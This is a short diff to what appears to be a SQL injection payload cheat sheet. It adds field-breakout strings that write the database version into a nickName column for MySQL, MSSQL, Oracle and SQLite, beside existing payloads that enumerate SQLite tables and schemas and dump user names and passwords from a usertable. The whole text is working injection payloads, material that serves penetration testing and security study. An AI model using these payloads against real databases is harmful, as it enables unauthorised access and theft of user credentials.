@@ -37,6 +37,13 @@ sqlite_version()
 ```
 > INPUT
 ```
+# MySQL and MSSQL
+',nickName=@@version,email='
+# For Oracle
+',nickName=(SELECT banner FROM v$version),email='
+# For SQLite
+',nickName=sqlite_version(),email='
+
 (SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%')
 (SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='usertable')
 (SELECT group_concat(profileID || "," || name || "," || password || ":") from usertable)
